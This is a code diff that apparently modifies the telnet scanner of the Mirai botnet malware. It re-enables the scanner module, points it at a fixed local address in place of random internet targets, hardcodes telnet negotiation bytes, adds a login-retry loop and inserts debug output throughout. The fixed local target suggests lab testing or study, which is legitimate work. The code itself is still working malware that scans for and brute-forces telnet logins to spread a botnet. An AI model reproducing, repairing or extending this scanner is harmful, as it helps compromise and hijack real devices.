@@ -1,6 +1,6 @@
 #define _GNU_SOURCE
 
-#ifdef MIRAI_TELNET
+//#ifdef MIRAI_TELNET
 
 #ifdef DEBUG
 #include <stdio.h>
@@ -210,7 +210,8 @@ void scanner_init(void)
 
                 iph->id = rand_next();
                 iph->saddr = LOCAL_ADDR;
-                iph->daddr = get_random_ip();
+                // iph->daddr = get_random_ip();
+                iph->daddr = INET_ADDR(192,168,1,100);
                 iph->check = 0;
                 iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
 
@@ -356,6 +357,7 @@ void scanner_init(void)
 
         for (i = 0; i < SCANNER_MAX_CONNS; i++)
         {
+            int attempt = 0;
             conn = &conn_table[i];
 
             if (conn->fd == -1)
@@ -445,7 +447,8 @@ void scanner_init(void)
                     while (TRUE)
                     {
                         int consumed = 0;
-
+                        printf("[scanner] FD%d - connection state %d\n", conn->fd, conn->state);
+                        
                         switch (conn->state)
                         {
                         case SC_HANDLE_IACS:
@@ -483,8 +486,9 @@ void scanner_init(void)
                             }
                             break;
                         case SC_WAITING_PASSWD_RESP:
-                            if ((consumed = consume_any_prompt(conn)) > 0)
+                            while (attempt < 10 || (consumed = consume_any_prompt(conn)) > 0)
                             {
+                                attempt++;
                                 char *tmp_str;
                                 int tmp_len;
 
@@ -520,7 +524,7 @@ void scanner_init(void)
                                 conn->state = SC_WAITING_SYSTEM_RESP;
                             }
                             break;
-			case SC_WAITING_SYSTEM_RESP:
+			            case SC_WAITING_SYSTEM_RESP:
                             if ((consumed = consume_any_prompt(conn)) > 0)
                             {
                                 char *tmp_str;
@@ -706,61 +710,95 @@ static ipv4_t get_random_ip(void)
 static int consume_iacs(struct scanner_connection *conn)
 {
     int consumed = 0;
-    uint8_t *ptr = conn->rdbuf;
+    // uint8_t *ptr = conn->rdbuf;
 
-    while (consumed < conn->rdbuf_pos)
-    {
-        int i;
+    char tmp1[] = {0xff, 0xfd, 0x03, 0xff, 0xfb, 0x18, 0xff, 0xfb, 0x1f, 0xff, 0xfb, 0x20,
+        0xff, 0xfb, 0x21, 0xff, 0xfb, 0x22, 0xff, 0xfb, 0x27, 0xff, 0xfd, 0x05};
+    char tmp2[] = {0xff, 0xfc, 0x23};
+    char tmp3[] = {0xff, 0xfa, 0x1f, 0x00, 0x6c, 0x00, 0x25, 0xff, 0xf0};
+    char tmp4[] = {0xff, 0xfa, 0x20, 0x00, 0x33, 0x38, 0x34, 0x30, 0x30, 0x2c, 
+        0x33, 0x38, 0x34, 0x30, 0x30, 0xff, 0xf0, 0xff, 0xfa, 0x27, 0x00, 0xff, 0xf0, 0xff, 0xfa,
+        0x18, 0x00, 0x78, 0x74, 0x65, 0x72, 0x6d, 0x2d, 0x32, 0x35, 0x36, 0x63, 0x6f, 0x6c, 0x6f,
+        0x72, 0xff, 0xf0};
+    char tmp5[] = {0xff, 0xfc, 0x01};
+    char tmp6[] = {0xff, 0xfd, 0x01};
 
-        if (*ptr != 0xff)
-            break;
-        else if (*ptr == 0xff)
-        {
-            if (!can_consume(conn, ptr, 1))
-                break;
-            if (ptr[1] == 0xff)
-            {
-                ptr += 2;
-                consumed += 2;
-                continue;
-            }
-            else if (ptr[1] == 0xfd)
-            {
-                uint8_t tmp1[3] = {255, 251, 31};
-                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};
+    sleep(1);
+    send(conn->fd, &tmp1[0], 24, MSG_NOSIGNAL);
+    sleep(1);
+    send(conn->fd, &tmp2[0], 3, MSG_NOSIGNAL);
+    sleep(1);
+    send(conn->fd, &tmp3[0], 9, MSG_NOSIGNAL);
+    sleep(1);
+    send(conn->fd, &tmp4[0], 43, MSG_NOSIGNAL);
+    sleep(1);
+    send(conn->fd, &tmp5[0], 3, MSG_NOSIGNAL);
+    sleep(1);
+    send(conn->fd, &tmp6[0], 3, MSG_NOSIGNAL);
+    sleep(1);
 
-                if (!can_consume(conn, ptr, 2))
-                    break;
-                if (ptr[2] != 31)
-                    goto iac_wont;
-
-                ptr += 3;
-                consumed += 3;
-
-                send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
-                send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
-            }
-            else
-            {
-                iac_wont:
-
-                if (!can_consume(conn, ptr, 2))
-                    break;
-
-                for (i = 0; i < 3; i++)
-                {
-                    if (ptr[i] == 0xfd)
-                        ptr[i] = 0xfc;
-                    else if (ptr[i] == 0xfb)
-                        ptr[i] = 0xfd;
-                }
-
-                send(conn->fd, ptr, 3, MSG_NOSIGNAL);
-                ptr += 3;
-                consumed += 3;
-            }
-        }
+    // ptr += conn->rdbuf_pos;
+    consumed += conn->rdbuf_pos;
+    printf("FD%d consumed: %d\n", conn->fd, conn->rdbuf_pos);
+    printf("FD%d content: ", conn->fd);
+    int i;
+    for (i = conn->rdbuf_pos - 1; i > 0; i--) {
+        printf("%c", conn->rdbuf[i]);
     }
+    printf("\nFD%d consume_iacs done\n", conn->fd);
+    // while (consumed < conn->rdbuf_pos)
+    // {
+    //     int i;
+
+    //     if (*ptr != 0xff)
+    //         break;
+    //     else if (*ptr == 0xff)
+    //     {
+    //         if (!can_consume(conn, ptr, 1))
+    //             break;
+    //         if (ptr[1] == 0xff)
+    //         {
+    //             ptr += 2;
+    //             consumed += 2;
+    //             continue;
+    //         }
+    //         else if (ptr[1] == 0xfd)
+    //         {
+    //             uint8_t tmp1[3] = {255, 251, 31};
+    //             uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};
+
+    //             if (!can_consume(conn, ptr, 2))
+    //                 break;
+    //             if (ptr[2] != 31)
+    //                 goto iac_wont;
+
+    //             ptr += 3;
+    //             consumed += 3;
+
+    //             send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
+    //             send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
+    //         }
+    //         else
+    //         {
+    //             iac_wont:
+
+    //             if (!can_consume(conn, ptr, 2))
+    //                 break;
+
+    //             for (i = 0; i < 3; i++)
+    //             {
+    //                 if (ptr[i] == 0xfd)
+    //                     ptr[i] = 0xfc;
+    //                 else if (ptr[i] == 0xfb)
+    //                     ptr[i] = 0xfd;
+    //             }
+
+    //             send(conn->fd, ptr, 3, MSG_NOSIGNAL);
+    //             ptr += 3;
+    //             consumed += 3;
+    //         }
+    //     }
+    // }
 
     return consumed;
 }
@@ -770,7 +808,12 @@ static int consume_any_prompt(struct scanner_connection *conn)
     char *pch;
     int i, prompt_ending = -1;
 
+    uint8_t *ptr = conn->rdbuf;
+
+    if (*ptr == 0xff) return 0;
+
     for (i = conn->rdbuf_pos - 1; i > 0; i--)
+    // for (i = 255; i > 0; i--)
     {
         if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
         {
@@ -790,11 +833,19 @@ static int consume_user_prompt(struct scanner_connection *conn)
     char *pch;
     int i, prompt_ending = -1;
 
-    for (i = conn->rdbuf_pos - 1; i > 0; i--)
+    uint8_t *ptr = conn->rdbuf;
+
+    if (*ptr == 0xff) return 0;
+
+    printf("[scanner] FD%d trying to find user prompt-related characters\n", conn->fd);
+    // for (i = conn->rdbuf_pos - 1; i > 0; i--)
+    for (i = 255; i > 0; i--)
     {
+        printf("%c", conn->rdbuf[i]);
         if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
         {
             prompt_ending = i + 1;
+            printf("\n[scanner] FD%d found prompt ending character\n", conn->fd);
             break;
         }
     }
@@ -802,15 +853,21 @@ static int consume_user_prompt(struct scanner_connection *conn)
     if (prompt_ending == -1)
     {
         int tmp;
-
-        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ogin", 4)) != -1)
+        printf("[scanner] FD%d looking for \"login\" or \"enter\"\n", conn->fd);
+        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ogin", 4)) != -1) {
+            printf("[scanner] FD%d found \"login\"\n", conn->fd);
             prompt_ending = tmp;
-        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "enter", 5)) != -1)
+        }
+        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "enter", 5)) != -1) {
+            printf("[scanner] FD%d found \"enter\"\n", conn->fd);
             prompt_ending = tmp;
+        }
     }
 
-    if (prompt_ending == -1)
+    if (prompt_ending == -1) {
+        printf("[scanner] FD%d - login prompt not found\n", conn->fd);
         return 0;
+    }
     else
         return prompt_ending;
 }
@@ -819,6 +876,19 @@ static int consume_pass_prompt(struct scanner_connection *conn)
 {
     char *pch;
     int i, prompt_ending = -1;
+
+    // uint8_t *ptr = conn->rdbuf;
+
+    // char tmp1[] = {0xff, 0xfa, 0x1f, 0x00, 0xcc, 0x00, 0x33, 0xff, 0xf0};
+    // char tmp2[] = {0xff, 0xfa, 0x1f, 0x00, 0xcc, 0x00, 0x34, 0xff, 0xf0};
+
+    // sleep(2);
+    // send(conn->fd, &tmp1[0], 9, MSG_NOSIGNAL);
+    // sleep(2);
+    // send(conn->fd, &tmp2[0], 9, MSG_NOSIGNAL);
+    // sleep(2);
+
+    // ptr += conn->rdbuf_pos;
 
     for (i = conn->rdbuf_pos - 1; i > 0; i--)
     {
@@ -988,4 +1058,4 @@ static BOOL can_consume(struct scanner_connection *conn, uint8_t *ptr, int amoun
     return ptr + amount < end;
 }
 
-#endif
+//#endif
